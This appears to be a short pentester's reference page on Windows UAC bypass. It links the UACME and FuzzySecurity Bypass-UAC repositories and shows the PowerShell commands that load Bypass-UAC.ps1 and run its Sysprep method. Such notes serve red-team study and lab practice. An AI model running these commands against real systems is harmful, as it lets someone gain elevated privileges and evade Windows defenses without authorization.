# UAC Bypass GitHub Repo List

OS: Windows
Description: UAC Bypass GitHub Repo
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### UAC GitHub Repo 1

```jsx
https://github.com/hfiref0x/UACME
```

### Bypass UAC Github

```jsx
https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
```

- Import and Run

```jsx
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```